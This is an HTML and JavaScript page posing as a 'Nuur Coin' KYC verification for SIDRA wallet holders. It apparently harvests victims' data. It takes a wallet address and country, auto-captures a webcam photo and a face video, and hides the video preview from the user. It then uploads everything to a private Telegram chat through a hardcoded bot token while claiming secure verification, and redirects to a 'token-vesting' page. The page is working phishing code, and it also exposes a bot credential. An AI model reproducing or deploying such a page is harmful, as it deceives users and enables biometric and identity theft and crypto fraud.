<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Nuur Coin - KYC Verification</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #4a00e0;
            --secondary: #8e2de2;
            --accent: #00c6ff;
            --dark: #1a1a2e;
            --light: #f8f9fa;
            --success: #28a745;
            --danger: #dc3545;
            --warning: #ffc107;
            --info: #17a2b8;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, var(--dark) 0%, #16213e 100%);
            color: var(--light);
            min-height: 100vh;
            background-attachment: fixed;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .container {
            max-width: 800px;
            width: 100%;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .logo-container {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo {
            width: 100px;
            height: 100px;
            margin: 0 auto 15px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
            animation: pulse 2s infinite;
            border: 2px solid rgba(255, 255, 255, 0.1);
        }
        
        .logo img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        h1 {
            text-align: center;
            margin-bottom: 20px;
            background: linear-gradient(to right, var(--accent), var(--primary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 2.5rem;
        }
        
        .step-container {
            display: none;
            animation: fadeIn 0.5s ease;
        }
        
        .step-container.active {
            display: block;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .intro-section {
            background: rgba(255, 255, 255, 0.03);
            padding: 20px;
            border-radius: 15px;
            margin-bottom: 25px;
        }
        
        .intro-section h2 {
            color: var(--accent);
            margin-bottom: 15px;
        }
        
        .disclaimer {
            background: rgba(220, 53, 69, 0.1);
            border-left: 4px solid var(--danger);
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
        }
        
        .consent-section {
            margin: 25px 0;
        }
        
        .consent-checkbox {
            display: flex;
            align-items: flex-start;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
        }
        
        input, select {
            width: 100%;
            padding: 12px 15px;
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            background: rgba(255, 255, 255, 0.05);
            color: var(--light);
            font-size: 16px;
        }
        
        input:focus, select:focus {
            outline: none;
            border-color: var(--accent);
        }
        
        .verification-section {
            display: flex;
            flex-direction: column;
            gap: 20px;
            margin: 30px 0;
        }
        
        .capture-container {
            background: rgba(255, 255, 255, 0.03);
            padding: 20px;
            border-radius: 15px;
            text-align: center;
        }
        
        .capture-container h3 {
            margin-bottom: 15px;
            color: var(--accent);
        }
        
        .preview {
            width: 100%;
            max-width: 300px;
            height: 200px;
            background: rgba(0, 0, 0, 0.2);
            border-radius: 10px;
            margin: 0 auto 15px;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .preview video, .preview img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .btn {
            padding: 12px 25px;
            border-radius: 50px;
            border: none;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .btn-primary {
            background: linear-gradient(to right, var(--primary), var(--secondary));
            color: white;
        }
        
        .btn-secondary {
            background: rgba(255, 255, 255, 0.1);
            color: white;
        }
        
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }
        
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .action-buttons {
            display: flex;
            justify-content: space-between;
            margin-top: 30px;
        }
        
        .countdown {
            font-size: 18px;
            font-weight: bold;
            color: var(--accent);
            margin: 10px 0;
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 25px;
            border-radius: 10px;
            background: var(--dark);
            color: white;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
            display: flex;
            align-items: center;
            gap: 10px;
            transform: translateX(100%);
            transition: transform 0.3s ease;
            z-index: 1000;
        }
        
        .notification.show {
            transform: translateX(0);
        }
        
        .notification.success {
            border-left: 4px solid var(--success);
        }
        
        .notification.error {
            border-left: 4px solid var(--danger);
        }
        
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .step-indicator {
            display: flex;
            justify-content: space-between;
            margin-bottom: 30px;
            position: relative;
        }
        
        .step-indicator::before {
            content: '';
            position: absolute;
            top: 20px;
            left: 0;
            right: 0;
            height: 2px;
            background: rgba(255, 255, 255, 0.1);
            z-index: 1;
        }
        
        .step {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            z-index: 2;
            font-weight: bold;
        }
        
        .step.active {
            background: linear-gradient(to right, var(--primary), var(--secondary));
        }
        
        .step.completed {
            background: var(--success);
        }
        
        .photo-countdown {
            font-size: 24px;
            font-weight: bold;
            color: var(--accent);
            margin: 15px 0;
            text-align: center;
        }
        
        .progress-bar {
            height: 6px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 3px;
            margin: 15px 0;
            overflow: hidden;
        }
        
        .progress {
            height: 100%;
            background: linear-gradient(to right, var(--primary), var(--accent));
            width: 0%;
            transition: width 0.3s ease;
        }
        
        .status-message {
            text-align: center;
            margin: 15px 0;
            font-weight: 500;
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 20px;
            }
            
            h1 {
                font-size: 2rem;
            }
            
            .verification-section {
                flex-direction: column;
            }
            
            .action-buttons {
                flex-direction: column;
                gap: 15px;
            }
            
            .action-buttons .btn {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <div class="logo">
                <img src="logo.png" alt="Nuur Coin Logo">
            </div>
            <h1>Nuur Coin KYC Verification</h1>
        </div>
        
        <div class="step-indicator">
            <div class="step active" id="step1">1</div>
            <div class="step" id="step2">2</div>
            <div class="step" id="step3">3</div>
            <div class="step" id="step4">4</div>
        </div>
        
        <!-- Step 1: Introduction and Consent -->
        <div class="step-container active" id="step1-container">
            <div class="intro-section">
                <h2>Welcome to Nuur Coin KYC Verification</h2>
                <p>To ensure the security of our platform and comply with regulatory requirements, we need to verify your identity. Our process is simple and respects your privacy:</p>
                <ul style="margin: 15px 0 15px 20px;">
                    <li>No government ID required</li>
                    <li>Only one photo and a short video for liveness check</li>
                    <li>Quick and secure process</li>
                </ul>
                
                <div class="disclaimer">
                    <strong>Important Disclaimer:</strong> This verification process is required to prevent fraud and ensure compliance with financial regulations. Your data will be securely processed and stored. By proceeding, you acknowledge that you understand and accept our terms.
                </div>
            </div>
            
            <div class="consent-section">
                <h3>Data Consent</h3>
                <p>We need your consent to collect and process your biometric data for identity verification purposes.</p>
                
                <div class="consent-checkbox">
                    <input type="checkbox" id="consentCheckbox">
                    <label for="consentCheckbox">I consent to Nuur Coin collecting and processing my photo and video for identity verification purposes. I understand that this data will be securely stored and used solely for verification and security purposes.</label>
                </div>
            </div>
            
            <div class="action-buttons">
                <div></div> <!-- Empty div for spacing -->
                <button class="btn btn-primary" id="step1-next">
                    Next <i class="fas fa-arrow-right"></i>
                </button>
            </div>
        </div>
        
        <!-- Step 2: Wallet and Country Information -->
        <div class="step-container" id="step2-container">
            <div class="form-section">
                <div class="form-group">
                    <label for="walletAddress">SIDRA (SDA) Wallet Address</label>
                    <input type="text" id="walletAddress" placeholder="Enter your SDA wallet address">
                </div>
                
                <div class="form-group">
                    <label for="country">Country of Residence</label>
                    <select id="country">
                        <option value="">Select your country</option>
                        <!-- Countries will be populated by JavaScript -->
                    </select>
                </div>
            </div>
            
            <div class="action-buttons">
                <button class="btn btn-secondary" id="step2-back">
                    <i class="fas fa-arrow-left"></i> Back
                </button>
                <button class="btn btn-primary" id="step2-next">
                    Next <i class="fas fa-arrow-right"></i>
                </button>
            </div>
        </div>
        
        <!-- Step 3: Photo Capture -->
        <div class="step-container" id="step3-container">
            <div class="capture-container">
                <h3>Step 1: Take a Photo</h3>
                <p>Please look directly at the camera. Photo will be automatically taken in <span id="photoCountdown">5</span> seconds.</p>
                
                <div class="progress-bar">
                    <div class="progress" id="photoProgress"></div>
                </div>
                
                <div class="preview" id="photoPreview">
                    <i class="fas fa-camera fa-3x"></i>
                </div>
                
                <div class="status-message" id="photoResult" style="display: none; color: var(--success);">
                    <i class="fas fa-check-circle"></i> Photo captured successfully!
                </div>
            </div>
            
            <div class="action-buttons">
                <button class="btn btn-secondary" id="step3-back">
                    <i class="fas fa-arrow-left"></i> Back
                </button>
                <button class="btn btn-primary" id="step3-next" disabled>
                    Next <i class="fas fa-arrow-right"></i>
                </button>
            </div>
        </div>
        
        <!-- Step 4: Video Recording -->
        <div class="step-container" id="step4-container">
            <div class="capture-container">
                <h3>Step 2: Record Liveness Video (10 seconds)</h3>
                <p>Please follow the instructions: blink your eyes and turn your head slightly side to side.</p>
                
                <div class="preview" id="videoPreview">
                    <i class="fas fa-video fa-3x"></i>
                </div>
                
                <div class="countdown" id="countdown" style="display: none;">10</div>
                
                <div class="status-message" id="videoResult" style="display: none; color: var(--success);">
                    <i class="fas fa-check-circle"></i> Video recorded successfully!
                </div>
                
                <button class="btn btn-secondary" id="startVideoBtn">
                    <i class="fas fa-record-vinyl"></i> Start Recording
                </button>
            </div>
            
            <div class="action-buttons">
                <button class="btn btn-secondary" id="step4-back">
                    <i class="fas fa-arrow-left"></i> Back
                </button>
                <button class="btn btn-primary" id="verifyBtn" disabled>
                    <i class="fas fa-check-circle"></i> Verify Identity
                </button>
            </div>
        </div>
    </div>
    
    <div class="notification" id="notification">
        <i class="fas fa-check-circle"></i>
        <div class="notification-content">Operation completed successfully!</div>
    </div>

    <script>
        // Telegram Bot Configuration - REPLACE WITH YOUR ACTUAL VALUES
        const TELEGRAM_BOT_TOKEN = '7696002900:AAHUIzkUXNrFFhUZVTRT-zhiZNkv1SmBi7Q';
        const TELEGRAM_CHAT_ID = '7181820663';
        const SUBMISSION_TIMEOUT = 180000; // 3 minutes in milliseconds
        
        // Populate countries list
        const countries = [
            "Afghanistan", "Albania", "Algeria", "Andorra", "Angola", "Antigua and Barbuda", "Argentina", "Armenia", 
            "Australia", "Austria", "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", 
            "Belize", "Benin", "Bhutan", "Bolivia", "Bosnia and Herzegovina", "Botswana", "Brazil", "Brunei", "Bulgaria", 
            "Burkina Faso", "Burundi", "Cabo Verde", "Cambodia", "Cameroon", "Canada", "Central African Republic", "Chad", 
            "Chile", "China", "Colombia", "Comoros", "Congo", "Costa Rica", "Croatia", "Cuba", "Cyprus", "Czech Republic", 
            "Denmark", "Djibouti", "Dominica", "Dominican Republic", "Ecuander", "Egypt", "El Salvador", "Equatorial Guinea", 
            "Eritrea", "Estonia", "Eswatini", "Ethiopia", "Fiji", "Finland", "France", "Gabon", "Gambia", "Georgia", 
            "Germany", "Ghana", "Greece", "Grenada", "Guatemala", "Guinea", "Guinea-Bissau", "Guyana", "Haiti", "Honduras", 
            "Hungary", "Iceland", "India", "Indonesia", "Iran", "Iraq", "Ireland", "Israel", "Italy", "Jamaica", "Japan", 
            "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Korea, North", "Korea, South", "Kosovo", "Kuwait", "Kyrgyzstan", 
            "Laos", "Latvia", "Lebanon", "Lesotho", "Liberia", "Libya", "Liechtenstein", "Lithuania", "Luxembourg", 
            "Madagascar", "Malawi", "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Mauritania", "Mauritius", 
            "Mexico", "Micronesia", "Moldova", "Monaco", "Mongolia", "Montenegro", "Morocco", "Mozambique", "Myanmar", 
            "Namibia", "Nauru", "Nepal", "Netherlands", "New Zealand", "Nicaragua", "Niger", "Nigeria", "North Macedonia", 
            "Norway", "Oman", "Pakistan", "Palau", "Palestine", "Panama", "Papua New Guinea", "Paraguay", "Peru", 
            "Philippines", "Poland", "Portugal", "Qatar", "Romania", "Russia", "Rwanda", "Saint Kitts and Nevis", 
            "Saint Lucia", "Saint Vincent and the Grenadines", "Samoa", "San Marino", "Sao Tome and Principe", 
            "Saudi Arabia", "Senegal", "Serbia", "Seychelles", "Sierra Leone", "Singapore", "Slovakia", "Slovenia", 
            "Solomon Islands", "Somalia", "South Africa", "South Sudan", "Spain", "Sri Lanka", "Sudan", "Suriname", 
            "Sweden", "Switzerland", "Syria", "Taiwan", "Tajikistan", "Tanzania", "Thailand", "Timor-Leste", "Togo", 
            "Tonga", "Trinidad and Tobago", "Tunisia", "Turkey", "Turkmenistan", "Tuvalu", "Uganda", "Ukraine", 
            "United Arab Emirates", "United Kingdom", "United States", "Uruguay", "Uzbekistan", "Vanuatu", "Vatican City", 
            "Venezuela", "Vietnam", "Yemen", "Zambia", "Zimbabwe"
        ];
        
        // DOM Elements
        const stepContainers = document.querySelectorAll('.step-container');
        const steps = document.querySelectorAll('.step');
        const consentCheckbox = document.getElementById('consentCheckbox');
        const walletAddressInput = document.getElementById('walletAddress');
        const countrySelect = document.getElementById('country');
        const startVideoBtn = document.getElementById('startVideoBtn');
        const verifyBtn = document.getElementById('verifyBtn');
        const photoPreview = document.getElementById('photoPreview');
        const videoPreview = document.getElementById('videoPreview');
        const countdownEl = document.getElementById('countdown');
        const notificationEl = document.getElementById('notification');
        const photoCountdownEl = document.getElementById('photoCountdown');
        const photoProgressEl = document.getElementById('photoProgress');
        const photoResultEl = document.getElementById('photoResult');
        const videoResultEl = document.getElementById('videoResult');
        
        // Navigation buttons
        const step1NextBtn = document.getElementById('step1-next');
        const step2BackBtn = document.getElementById('step2-back');
        const step2NextBtn = document.getElementById('step2-next');
        const step3BackBtn = document.getElementById('step3-back');
        const step3NextBtn = document.getElementById('step3-next');
        const step4BackBtn = document.getElementById('step4-back');
        
        // State
        let currentStep = 1;
        let photoData = null;
        let videoBlob = null;
        let videoStream = null;
        let mediaRecorder = null;
        let recordedChunks = [];
        let countdown = 10;
        let countdownInterval = null;
        let photoTimer = null;
        let submissionTimeout = null;
        
        // Initialize
        window.addEventListener('load', () => {
            // Populate countries dropdown
            countries.forEach(country => {
                const option = document.createElement('option');
                option.value = country;
                option.textContent = country;
                countrySelect.appendChild(option);
            });
            
            // Set up event listeners
            setupEventListeners();
        });
        
        function setupEventListeners() {
            // Navigation
            step1NextBtn.addEventListener('click', () => navigateTo(2));
            step2BackBtn.addEventListener('click', () => navigateTo(1));
            step2NextBtn.addEventListener('click', () => navigateTo(3));
            step3BackBtn.addEventListener('click', () => navigateTo(2));
            step3NextBtn.addEventListener('click', () => navigateTo(4));
            step4BackBtn.addEventListener('click', () => navigateTo(3));
            
            // Form validation
            consentCheckbox.addEventListener('change', validateStep1);
            walletAddressInput.addEventListener('input', validateStep2);
            countrySelect.addEventListener('change', validateStep2);
            
            // Video recording
            startVideoBtn.addEventListener('click', startVideoRecording);
            
            // Verification
            verifyBtn.addEventListener('click', verifyIdentity);
        }
        
        function navigateTo(step) {
            // Hide current step
            document.getElementById(`step${currentStep}-container`).classList.remove('active');
            steps[currentStep - 1].classList.remove('active');
            
            // Show new step
            document.getElementById(`step${step}-container`).classList.add('active');
            steps[step - 1].classList.add('active');
            
            // Update current step
            currentStep = step;
            
            // Special handling for step 3 (photo capture)
            if (step === 3) {
                startPhotoCapture();
            }
            
            // Special handling for step 4 (video recording)
            if (step === 4) {
                // Reset video recording state
                videoBlob = null;
                videoPreview.innerHTML = '<i class="fas fa-video fa-3x"></i>';
                startVideoBtn.style.display = 'inline-flex';
                videoResultEl.style.display = 'none';
                verifyBtn.disabled = true;
            }
        }
        
        function validateStep1() {
            step1NextBtn.disabled = !consentCheckbox.checked;
        }
        
        function validateStep2() {
            const hasWallet = walletAddressInput.value.trim() !== '';
            const hasCountry = countrySelect.value !== '';
            step2NextBtn.disabled = !(hasWallet && hasCountry);
        }
        
        function startPhotoCapture() {
            // Reset state
            photoData = null;
            photoPreview.innerHTML = '<i class="fas fa-camera fa-3x"></i>';
            photoResultEl.style.display = 'none';
            step3NextBtn.disabled = true;
            photoProgressEl.style.width = '0%';
            
            // Start countdown
            let countdown = 5;
            photoCountdownEl.textContent = countdown;
            
            // Show camera access message
            showNotification("Please allow camera access when prompted", "success");
            
            // Start countdown and capture photo
            let countdownInterval = setInterval(() => {
                countdown--;
                photoCountdownEl.textContent = countdown;
                photoProgressEl.style.width = `${(5 - countdown) * 20}%`;
                
                if (countdown <= 0) {
                    clearInterval(countdownInterval);
                    capturePhoto();
                }
            }, 1000);
        }
        
        function capturePhoto() {
            // Access camera and capture photo
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    video.addEventListener('canplay', () => {
                        // Create canvas to capture photo
                        const canvas = document.createElement('canvas');
                        const context = canvas.getContext('2d');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        
                        // Draw video frame to canvas
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        // Convert to data URL
                        photoData = canvas.toDataURL('image/png');
                        
                        // Display preview
                        photoPreview.innerHTML = '';
                        const img = document.createElement('img');
                        img.src = photoData;
                        photoPreview.appendChild(img);
                        
                        // Stop video stream
                        stream.getTracks().forEach(track => track.stop());
                        
                        // Show success message
                        photoResultEl.style.display = 'block';
                        step3NextBtn.disabled = false;
                        
                        showNotification("Photo captured successfully!", "success");
                    });
                })
                .catch(error => {
                    console.error("Error accessing camera:", error);
                    showNotification("Could not access camera. Please check permissions.", "error");
                    
                    // Allow manual progression even if camera fails
                    photoCountdownEl.textContent = "Camera access denied";
                    step3NextBtn.disabled = false;
                });
        }
        
        function startVideoRecording() {
            // Access camera for video recording
            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                .then(stream => {
                    videoStream = stream;
                    
                    // Don't show video preview to user (as requested)
                    videoPreview.innerHTML = '<div class="status-message"><i class="fas fa-video"></i> Recording in progress...</div>';
                    
                    // Setup media recorder
                    recordedChunks = [];
                    mediaRecorder = new MediaRecorder(videoStream, { mimeType: 'video/webm' });
                    
                    mediaRecorder.ondataavailable = (event) => {
                        if (event.data.size > 0) {
                            recordedChunks.push(event.data);
                        }
                    };
                    
                    mediaRecorder.onstop = () => {
                        // Create blob from recorded chunks
                        videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
                        
                        // Stop video stream
                        videoStream.getTracks().forEach(track => track.stop());
                        
                        // Show success message and enable verify button
                        videoPreview.innerHTML = '<i class="fas fa-video fa-3x"></i>';
                        videoResultEl.style.display = 'block';
                        verifyBtn.disabled = false;
                        startVideoBtn.style.display = 'none';
                        
                        showNotification("Video recorded successfully!", "success");
                    };
                    
                    // Start recording
                    mediaRecorder.start();
                    
                    // Start countdown
                    countdown = 10;
                    countdownEl.textContent = countdown;
                    countdownEl.style.display = 'block';
                    
                    startVideoBtn.style.display = 'none';
                    
                    countdownInterval = setInterval(() => {
                        countdown--;
                        countdownEl.textContent = countdown;
                        
                        if (countdown <= 0) {
                            clearInterval(countdownInterval);
                            countdownEl.style.display = 'none';
                            mediaRecorder.stop();
                        }
                    }, 1000);
                })
                .catch(error => {
                    console.error("Error accessing camera for video:", error);
                    showNotification("Could not access camera. Please check permissions.", "error");
                });
        }
        
        async function verifyIdentity() {
            try {
                verifyBtn.disabled = true;
                verifyBtn.innerHTML = '<span class="loading"></span> Verifying...';
                
                // Set timeout for submission (3 minutes)
                submissionTimeout = setTimeout(() => {
                    showNotification("Submission timeout. Please try again.", "error");
                    verifyBtn.innerHTML = '<i class="fas fa-check-circle"></i> Verify Identity';
                    verifyBtn.disabled = false;
                }, SUBMISSION_TIMEOUT);
                
                // Prepare text data for Telegram
                const textData = `New KYC Verification:\nWallet: ${walletAddressInput.value}\nCountry: ${countrySelect.value}`;
                
                // Send text message first
                const textResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: textData
                    })
                });
                
                if (!textResponse.ok) {
                    throw new Error('Failed to send text data to Telegram');
                }
                
                // Send photo if available
                if (photoData) {
                    // Convert base64 to blob
                    const photoBlob = dataURLToBlob(photoData);
                    const photoFormData = new FormData();
                    photoFormData.append('chat_id', TELEGRAM_CHAT_ID);
                    photoFormData.append('photo', photoBlob, 'kyc_photo.png');
                    photoFormData.append('caption', `Photo for: ${walletAddressInput.value}`);
                    
                    const photoResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: photoFormData
                    });
                    
                    if (!photoResponse.ok) {
                        throw new Error('Failed to send photo to Telegram');
                    }
                }
                
                // Send video if available
                if (videoBlob) {
                    const videoFormData = new FormData();
                    videoFormData.append('chat_id', TELEGRAM_CHAT_ID);
                    videoFormData.append('video', videoBlob, 'liveness_video.webm');
                    videoFormData.append('caption', `Video for: ${walletAddressInput.value}`);
                    
                    const videoResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
                        method: 'POST',
                        body: videoFormData
                    });
                    
                    if (!videoResponse.ok) {
                        throw new Error('Failed to send video to Telegram');
                    }
                }
                
                // Clear timeout
                clearTimeout(submissionTimeout);
                
                showNotification("KYC verification submitted successfully! Redirecting...", "success");
                
                // Redirect to token-vesting.html after 3 seconds
                setTimeout(() => {
                    window.location.href = 'token-vesting';
                }, 3000);
                
            } catch (error) {
                console.error("Error during verification:", error);
                showNotification("Verification failed. Please try again.", "error");
                verifyBtn.innerHTML = '<i class="fas fa-check-circle"></i> Verify Identity';
                verifyBtn.disabled = false;
                
                // Clear timeout if exists
                if (submissionTimeout) {
                    clearTimeout(submissionTimeout);
                }
            }
        }
        
        function dataURLToBlob(dataURL) {
            const parts = dataURL.split(';base64,');
            const contentType = parts[0].split(':')[1];
            const raw = window.atob(parts[1]);
            const uInt8Array = new Uint8Array(raw.length);
            
            for (let i = 0; i < raw.length; ++i) {
                uInt8Array[i] = raw.charCodeAt(i);
            }
            
            return new Blob([uInt8Array], { type: contentType });
        }
        
        function showNotification(message, type) {
            const icon = type === "success" ? "fa-check-circle" : "fa-exclamation-circle";
            notificationEl.innerHTML = `<i class="fas ${icon}"></i><div class="notification-content">${message}</div>`;
            notificationEl.className = `notification ${type} show`;
            
            setTimeout(() => {
                notificationEl.classList.remove('show');
            }, 5000);
        }
        
        // Initialize step validation
        validateStep1();
        validateStep2();
    </script>
</body>
</html>
